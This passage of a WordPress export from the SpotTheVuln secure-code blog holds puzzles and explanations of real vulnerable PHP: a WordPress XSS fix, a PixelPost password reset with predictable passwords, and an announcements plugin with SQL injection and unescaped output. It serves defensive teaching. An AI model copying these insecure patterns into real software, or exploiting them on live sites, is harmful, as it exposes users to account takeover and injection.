			<wp:comment_author_IP>67.169.124.224</wp:comment_author_IP>
			<wp:comment_date>2011-05-19 20:56:51</wp:comment_date>
			<wp:comment_date_gmt>2011-05-20 03:56:51</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[You guys have been doing a lot of SQL Injection and XSS.  I was wondering if you guys could show other problems like fail opens, file upload processing errors, parameter tampering, command injection, path traversal, authentication bypass, etc.


Regards,
Abe]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305863811.4132";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305878152.9185";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2083</wp:comment_id>
			<wp:comment_author><![CDATA[Abraham Kang]]></wp:comment_author>
			<wp:comment_author_email>abraham.kang@owasp.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.169.124.224</wp:comment_author_IP>
			<wp:comment_date>2011-05-19 20:53:55</wp:comment_date>
			<wp:comment_date_gmt>2011-05-20 03:53:55</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Looks like the wp_insert_post() will not sanitize the inserted data (because the user is an admin line 3) leaving the application open to stored XSS when the data is displayed on another page. 

Other parts of the page get request parameters and do not output encode the values.  However, the context of the output data is not provided so the appropriate output encoding cannot be reliably determined.

Regards,
Abe]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305863635.1045";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305878144.7466";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Expands - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/05/expands-cross-site-scripting/</link>
		<pubDate>Fri, 20 May 2011 12:30:16 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1459</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Wordpress Core

Fixed in Version: 2.8

Issue Type: Cross Site Scripting

Original Code: <a href="http://spotthevuln.com/2011/05/expands-2/">Found Here</a>
<h1>Details</h1>
This week’s bug was subtle.  The patch submitted by the developer addresses an XSS bug.  Looking at the diff, we see that $title and $selection come from the query string.  These values are fixed up before being assigned to a variable.  The developers changed the way $title is assigned in the diff.  It’s difficult to see why $title needs to be changed, so we’ll ignore that change for now.   $selection gives some hints towards XSS.  $selection is assigned from the query string value $_GET[‘s’] which is sent through the trim() and aposfix() functions.  Immediately following the $selection variable assignment we see the $selection being manipulated with some HTML tags.  This is a good indication that $selection will eventually be used to build HTML markup.  I usually recommend developers encode/sanitize values as close to the point of consumption as possible, but this case is different.  $selection contains HTML tags (the &lt;p&gt; and &lt;/p&gt; tags), so encoding the whole value at the point of consumption will also encode those tags.  The &lt;p&gt; tags are probably designed to be rendered by the browser.  Due to the mixing of HTML tags and regular data, the developer will have to encode the user controlled values during variable assignment.  This is exactly what the Wordpress developers did in the patch.


<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="68,69,70,71"]
&lt;?php

require_once('admin.php');
header('Content-Type: ' . get_option('html_type') . '; charset=' . get_option('blog_charset'));

if ( ! current_user_can('edit_posts') )
	wp_die( __( 'Cheatin&amp;#8217; uh?' ) );

function aposfix($text) {
	$translation_table[chr(34)] = '&amp;quot;';
	$translation_table[chr(38)] = '&amp;';
	$translation_table[chr(39)] = '&amp;apos;';
	return preg_replace(&quot;/&amp;(?![A-Za-z]{0,4}\w{2,3};|#[0-9]{2,3};)/&quot;,&quot;&amp;amp;&quot; , strtr($text, $translation_table));
}


function press_it() {
	// define some basic variables
	$quick['post_status'] = 'draft'; // set as draft first
	$quick['post_category'] = isset($_REQUEST['post_category']) ? $_REQUEST['post_category'] : null;
	$quick['tax_input'] = isset($_REQUEST['tax_input']) ? $_REQUEST['tax_input'] : '';
	$quick['post_title'] = isset($_REQUEST['title']) ? $_REQUEST['title'] : '';
	$quick['post_content'] = '';

	// insert the post with nothing in it, to get an ID
	$post_ID = wp_insert_post($quick, true);
	$content = isset($_REQUEST['content']) ? $_REQUEST['content'] : '';

	$upload = false;
	if( !empty($_REQUEST['photo_src']) &amp;&amp; current_user_can('upload_files') )
		foreach( (array) $_REQUEST['photo_src'] as $key =&gt; $image)
			// see if files exist in content - we don't want to upload non-used selected files.
			if( strpos($_REQUEST['content'], $image) !== false ) {
				$desc = isset($_REQUEST['photo_description'][$key]) ? $_REQUEST['photo_description'][$key] : '';
				$upload = media_sideload_image($image, $post_ID, $desc);

				// Replace the POSTED content &lt;img&gt; with correct uploaded ones. Regex contains fix for Magic Quotes
				if( !is_wp_error($upload) ) $content = preg_replace('/&lt;img ([^&gt;]*)src=\\\?(\&quot;|\')'.preg_quote($image, '/').'\\\?(\2)([^&gt;\/]*)\/*&gt;/is', $upload, $content);
			}

	// set the post_content and status
	$quick['post_status'] = isset($_REQUEST['publish']) ? 'publish' : 'draft';
	$quick['post_content'] = $content;
	// error handling for $post
	if ( is_wp_error($post_ID)) {
		wp_die($id);
		wp_delete_post($post_ID);
	// error handling for media_sideload
	} elseif ( is_wp_error($upload)) {
		wp_die($upload);
		wp_delete_post($post_ID);
	} else {
		$quick['ID'] = $post_ID;
		wp_update_post($quick);
	}
	return $post_ID;
}

// For submitted posts.
if ( isset($_REQUEST['action']) &amp;&amp; 'post' == $_REQUEST['action'] ) {
	check_admin_referer('press-this');
	$post_ID = press_it();
	$posted =  $post_ID;
} else {
	$post_ID = 0;
}

// Set Variables
-$title = isset($_GET['t']) ? esc_html(aposfix(stripslashes($_GET['t']))) : '';
-$selection = isset($_GET['s']) ? trim( aposfix( stripslashes($_GET['s']) ) ) : '';
+$title = isset( $_GET['t'] ) ? trim( strip_tags( aposfix( stripslashes( $_GET['t'] ) ) ) ) : ''; 
+$selection = isset( $_GET['s'] ) ? trim( htmlspecialchars( html_entity_decode( aposfix( stripslashes( $_GET['s'] ) ) ) ) ) : ''; 
if ( ! empty($selection) ) {
	$selection = preg_replace('/(\r?\n|\r)/', '&lt;/p&gt;&lt;p&gt;', $selection);
	$selection = '&lt;p&gt;'.str_replace('&lt;p&gt;&lt;/p&gt;', '', $selection).'&lt;/p&gt;';
}
$url = isset($_GET['u']) ? esc_url($_GET['u']) : '';
$image = isset($_GET['i']) ? $_GET['i'] : '';
...snip...
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1459</wp:post_id>
		<wp:post_date>2011-05-20 05:30:16</wp:post_date>
		<wp:post_date_gmt>2011-05-20 12:30:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>expands-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="query-string"><![CDATA[query string]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Action</title>
		<link>http://spotthevuln.com/2011/05/action/</link>
		<pubDate>Mon, 23 May 2011 12:30:03 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1463</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Take time to deliberate; but when the time for action arrives, stop thinking and go in.
Napoleon Bonaparte</strong></blockquote>
[sourcecode language="php"]
&lt;?php

...snip...
// forgot password?
if(isset($_GET['x']) &amp;&amp; $_GET['x']=='passreminder')
{
echo '&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;
  &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
	&lt;html&gt;
	&lt;head&gt;&lt;title&gt;$admin_lang_pw_title&lt;/title&gt;
	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt;&lt;/head&gt;
	&lt;body&gt;
	&lt;p style=&quot;border:solid 2px;padding:5px;color:red;font-weight:bold;font-size:11px;margin-left:auto;margin-right:auto;margin-top:10%;font-family:verdana,arial,sans-serif;text-align:center;&quot;&gt;';

	if ($cfgrow['admin']!= $_POST['user'])
	{
		echo &quot;&lt;span class=\&quot;confirm\&quot;&gt;$admin_lang_pw_wronguser&lt;/span&gt;&lt;br /&gt;&quot;;
		echo &quot;&lt;br /&gt;&lt;a href='index.php'&gt;$admin_lang_pw_back&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
		die();
	}
	if ($cfgrow['email']== &quot;&quot;)
	{
		echo &quot;&lt;span class=\&quot;confirm\&quot;&gt;$admin_lang_pw_noemail&lt;/span&gt;&lt;br /&gt;&quot;;
		echo &quot;&lt;br /&gt;&lt;a href='index.php' &gt; $admin_lang_pw_back &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
		die();
	}

	if (strtolower($cfgrow['email'])==strtolower($_POST['reminderemail']))
	{
		// generate a random new pass
		$user_pass = substr( MD5('time' . rand(1, 16000)), 0, 6);
		$query = &quot;update &quot;.$pixelpost_db_prefix.&quot;config set password=MD5('$user_pass') where admin='&quot;.$cfgrow['admin'].&quot;'&quot;;
		if(mysql_query($query))
		{
			$subject = &quot;$admin_lang_pw_subject&quot;;
			$body  = &quot;$admin_lang_pw_text_1 \n\n&quot;;
			$body .= &quot;$admin_lang_pw_usertext &quot;.$cfgrow['admin'].&quot; \n&quot;;
			$body .= &quot;$admin_lang_pw_mailtext &quot;.$cfgrow['email'].&quot; \n\n&quot;;
			$body .= &quot;$admin_lang_pw_newpw $user_pass&quot;;
			$body .= &quot;\n\n$admin_lang_pw_text_7&quot;.$cfgrow['siteurl'].&quot;admin $admin_lang_pw_text_8&quot;;

			$headers = &quot;Content-type: text/plain; charset=UTF-8\n&quot;;
			$headers .= &quot;$admin_lang_pw_text_2 &lt;&quot;.$cfgrow['email'].&quot;&gt;\n&quot;;

			$recipient_email = $cfgrow['email'];
			if (mail($recipient_email,$subject,$body,$headers))
				{echo &quot;$admin_lang_pw_text_3&quot; .$cfgrow['email'];}
			else { echo &quot;$admin_lang_pw_text_3&quot;;}
			echo &quot;&lt;br /&gt;&lt;a href='index.php' &gt; $admin_lang_pw_back &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
			die();
		}
		else
		{
			$dberror = mysql_error();
			echo &quot;$admin_lang_pw_text_5 &quot; .$dberror .&quot;$admin_lang_pw_text_5 &quot; ;
				echo &quot;&lt;br /&gt;&lt;a href='index.php' &gt; $admin_lang_pw_back &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
			die();
		}
	}
	else
	{
		echo &quot;&lt;span class=\&quot;confirm\&quot;&gt;$admin_lang_pw_notsent&lt;/span&gt;&lt;br /&gt;&quot;;
		echo &quot;&lt;br /&gt;&lt;a href='index.php'&gt; $admin_lang_pw_back &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
		die();
	}// end else (strtolower($cfgrow['email'])==strtolower($_POST['reminderemail']) &amp; $cfgrow['email']!= &quot;&quot;)

} // end if($_GET['x']=='passreminder')
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1463</wp:post_id>
		<wp:post_date>2011-05-23 05:30:03</wp:post_date>
		<wp:post_date_gmt>2011-05-23 12:30:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>action</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2099</wp:comment_id>
			<wp:comment_author><![CDATA[Defense In Depth, PHP, PixelPost, Solution Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/05/action-defense-in-depth/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-05-27 02:59:43</wp:comment_date>
			<wp:comment_date_gmt>2011-05-27 09:59:43</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Action [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1306738821.8863";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1306490383.0706";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Action - Defense in Depth</title>
		<link>http://spotthevuln.com/2011/05/action-defense-in-depth/</link>
		<pubDate>Fri, 27 May 2011 09:59:37 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1466</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: PixelPost

Fixed in Version: ?

Issue Type: Insecure password reset functionality

Original Code: <a href="http://spotthevuln.com/2011/05/action/">Found Here</a>
<h1>Details</h1>
This week’s bug is more of a design issue as opposed to an implementation issue.  I actually first heard about this code from SkullSecurity’s excellent articles on <a href="http://www.skullsecurity.org/blog/2011/hacking-crappy-password-resets-part-2">“Hacking Crappy Password Resets”</a> articles published in late March.  SkullSecurity does an excellent job of explaining that line 31(the line that does the actual password generation) is full of bad security design.  First, the password reset code is using the MD5() function in PHP.  MD5() takes a string and returns a MD5 hash of that string.  In this password reset code, we see that we are hashing the value of: 'time' . rand(1, 16000).  SkullSecurity astutely points out that the password reset code is using the string ‘time’, NOT the function time() which would return the number of seconds since epoch.  The string ‘time’ has a random number between 1 and 16000 appended to it and is passed to MD5().  Assuming rand() generates a truly random number between 1 and 16000, we only have 16000 possible combinations for the newly reset password.  Unfortunately, in many circumstances, rand() doesn’t generate a truly random number.  Many times, rand() will use system time as a seed value and produce a number that is predictable.  In many cases, it may be possible to predict or leak system time for the machine generating the random password.  Stefan Esser wrote an <a href="http://www.suspekt.org/2008/08/17/mt_srand-and-not-so-random-numbers/">excellent article</a> on the challenges of generating random numbers in PHP which covers many of these scenarios.

So what should the author do?  Change ‘time’ to time()?  Even if the author changed the string ‘time’ to the function time(), time() in PHP only returns seconds since epoch time.  If an attacker can leak system time, they’ll still be able to predict the password reset value… 


<h1>Developers Solution</h1>
[sourcecode language="php" highlight="31"]
&lt;?php

...snip...
// forgot password?
if(isset($_GET['x']) &amp;&amp; $_GET['x']=='passreminder')
{
echo '&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;
  &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
	&lt;html&gt;
	&lt;head&gt;&lt;title&gt;$admin_lang_pw_title&lt;/title&gt;
	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt;&lt;/head&gt;
	&lt;body&gt;
	&lt;p style=&quot;border:solid 2px;padding:5px;color:red;font-weight:bold;font-size:11px;margin-left:auto;margin-right:auto;margin-top:10%;font-family:verdana,arial,sans-serif;text-align:center;&quot;&gt;';

	if ($cfgrow['admin']!= $_POST['user'])
	{
		echo &quot;&lt;span class=\&quot;confirm\&quot;&gt;$admin_lang_pw_wronguser&lt;/span&gt;&lt;br /&gt;&quot;;
		echo &quot;&lt;br /&gt;&lt;a href='index.php'&gt;$admin_lang_pw_back&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
		die();
	}
	if ($cfgrow['email']== &quot;&quot;)
	{
		echo &quot;&lt;span class=\&quot;confirm\&quot;&gt;$admin_lang_pw_noemail&lt;/span&gt;&lt;br /&gt;&quot;;
		echo &quot;&lt;br /&gt;&lt;a href='index.php' &gt; $admin_lang_pw_back &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
		die();
	}

	if (strtolower($cfgrow['email'])==strtolower($_POST['reminderemail']))
	{
		// generate a random new pass
		$user_pass = substr( MD5('time' . rand(1, 16000)), 0, 6);
		$query = &quot;update &quot;.$pixelpost_db_prefix.&quot;config set password=MD5('$user_pass') where admin='&quot;.$cfgrow['admin'].&quot;'&quot;;
		if(mysql_query($query))
		{
			$subject = &quot;$admin_lang_pw_subject&quot;;
			$body  = &quot;$admin_lang_pw_text_1 \n\n&quot;;
			$body .= &quot;$admin_lang_pw_usertext &quot;.$cfgrow['admin'].&quot; \n&quot;;
			$body .= &quot;$admin_lang_pw_mailtext &quot;.$cfgrow['email'].&quot; \n\n&quot;;
			$body .= &quot;$admin_lang_pw_newpw $user_pass&quot;;
			$body .= &quot;\n\n$admin_lang_pw_text_7&quot;.$cfgrow['siteurl'].&quot;admin $admin_lang_pw_text_8&quot;;

			$headers = &quot;Content-type: text/plain; charset=UTF-8\n&quot;;
			$headers .= &quot;$admin_lang_pw_text_2 &lt;&quot;.$cfgrow['email'].&quot;&gt;\n&quot;;

			$recipient_email = $cfgrow['email'];
			if (mail($recipient_email,$subject,$body,$headers))
				{echo &quot;$admin_lang_pw_text_3&quot; .$cfgrow['email'];}
			else { echo &quot;$admin_lang_pw_text_3&quot;;}
			echo &quot;&lt;br /&gt;&lt;a href='index.php' &gt; $admin_lang_pw_back &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
			die();
		}
		else
		{
			$dberror = mysql_error();
			echo &quot;$admin_lang_pw_text_5 &quot; .$dberror .&quot;$admin_lang_pw_text_5 &quot; ;
				echo &quot;&lt;br /&gt;&lt;a href='index.php' &gt; $admin_lang_pw_back &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
			die();
		}
	}
	else
	{
		echo &quot;&lt;span class=\&quot;confirm\&quot;&gt;$admin_lang_pw_notsent&lt;/span&gt;&lt;br /&gt;&quot;;
		echo &quot;&lt;br /&gt;&lt;a href='index.php'&gt; $admin_lang_pw_back &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
		die();
	}// end else (strtolower($cfgrow['email'])==strtolower($_POST['reminderemail']) &amp; $cfgrow['email']!= &quot;&quot;)

} // end if($_GET['x']=='passreminder')
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1466</wp:post_id>
		<wp:post_date>2011-05-27 02:59:37</wp:post_date>
		<wp:post_date_gmt>2011-05-27 09:59:37</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>action-defense-in-depth</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="pixelpost"><![CDATA[PixelPost]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2191</wp:comment_id>
			<wp:comment_author><![CDATA[bingo australia]]></wp:comment_author>
			<wp:comment_author_email>d.yejoub@msn.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.firstcoastnews.com/life/community/persona.aspx?U=0726f937bcf34704aba0c304ff5d3dd8&amp;plckPersonaPage=BlogViewPost&amp;plckUserId=0726f937bcf34704aba0c304ff5d3dd8&amp;plckPostId=Blog%3a0726</wp:comment_author_url>
			<wp:comment_author_IP>31.3.230.98</wp:comment_author_IP>
			<wp:comment_date>2012-04-23 03:22:25</wp:comment_date>
			<wp:comment_date_gmt>2012-04-23 10:22:25</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[<a href="http://www.firstcoastnews.com/life/community/persona.aspx?U=0726f937bcf34704aba0c304ff5d3dd8&amp;plckPersonaPage=BlogViewPost&amp;plckUserId=0726f937bcf34704aba0c304ff5d3dd8&amp;plckPostId=Blog%3a0726f937bcf34704aba0c304ff5d3dd8Post%3a6da4dd99-ab2b-4051-9b4f-d797bafe2543&amp;plckBlogItemsPerPage=5" title="online bingo" rel="nofollow">online bingo</a> 
Airplane Traveling Online games - Ever before Played Computer Jet Traveling Online games]]></wp:comment_content>
			<wp:comment_approved>0</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1335176545.4153";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Third</title>
		<link>http://spotthevuln.com/2011/05/third/</link>
		<pubDate>Mon, 30 May 2011 12:30:41 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1471</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Sullivan's Law: When given the choice between two alternatives, always pick the third!
Patrick H. Sullivan</strong></blockquote>
<code lang="PHP">
<?php
...snip...
	//This if() statement handles user input from the edit section.
	if($_REQUEST['submitted'] == 'yes'){ // BEGIN submit handling if()

		$ninja_annc_id = $_REQUEST['ninja_annc_id'];
	
		$ninja_annc_begindate = $_REQUEST['begindate'];
		$ninja_annc_begintimehr = $_REQUEST['begintimehr'];
		$ninja_annc_begintimemin = $_REQUEST['begintimemin'];
		$ninja_annc_begintimeampm = $_REQUEST['begintimeampm'];
		
		$ninja_annc_enddate = $_REQUEST['enddate'];
		$ninja_annc_endtimehr = $_REQUEST['endtimehr'];
		$ninja_annc_endtimemin = $_REQUEST['endtimemin'];
		$ninja_annc_endtimeampm = $_REQUEST['endtimeampm'];
		
		$ninja_annc_begindate = $ninja_annc_begindate.' '.$ninja_annc_begintimehr.':'.$ninja_annc_begintimemin.$ninja_annc_begintimeampm;
		$ninja_annc_enddate = $ninja_annc_enddate.' '.$ninja_annc_endtimehr.':'.$ninja_annc_endtimemin.$ninja_annc_endtimeampm;
		
		//echo "begin before ".$ninja_annc_begindate;
		//echo "end before ".$ninja_annc_enddate;
		
		$ninja_annc_message = stripslashes($_REQUEST['content']);
		$ninja_annc_active = 1;
		$ninja_annc_location = $_REQUEST['ninja_annc_location'];
		
		$ninja_annc_begindate = strtotime($ninja_annc_begindate);
		$ninja_annc_enddate = strtotime($ninja_annc_enddate);
		
		//echo "begin after ".$ninja_annc_begindate;
		//echo "end after ".$ninja_annc_enddate;
		
		if($_REQUEST['ignoredates'] == "checked"){
			$ninja_annc_begindate = 0;
			$ninja_annc_enddate = 0;
		}
		
		if($_REQUEST['ninja_annc_id'] == 'new'){
			$rows_affected = $wpdb->insert( $ninja_annc_table_name, array( 'begindate' => $ninja_annc_begindate, 'enddate' => $ninja_annc_enddate, 'message' => $ninja_annc_message, 'active' => '0', 'location' => $ninja_annc_location ) );
		}else{
			$wpdb->update( $ninja_annc_table_name, array( 'begindate' => $ninja_annc_begindate, 'enddate' => $ninja_annc_enddate, 'message' => $ninja_annc_message, 'location' => $ninja_annc_location ), array( 'id' => $ninja_annc_id ));
		}
		
		echo "<script language='javascript'>window.location = '".$admin_url."'</script>";
	} // END submit handling if()
	
	//This if...else() statement handles the nuts and bolts of our html output. 
	//Eventually it will be replaced by a switch().
	//Flow goes: Edit Announcement? -> New Announcement? -> Table.
	//This part of our If...else statement creates the editing HTML
	if($_REQUEST['action'] == 'edit') { //BEGIN edit handling if()
		
		$ninja_annc_id = $_REQUEST['ninja_annc_id'];
		$ninja_annc_row = $wpdb->get_row("SELECT * FROM $ninja_annc_table_name WHERE id = $ninja_annc_id", ARRAY_A);

		$ninja_annc_id = $ninja_annc_row['id'];
		$ninja_annc_location = $ninja_annc_row['location'];
		$ninja_annc_message = stripslashes($ninja_annc_row['message']);
		$ninja_annc_begin = $ninja_annc_row['begindate'];
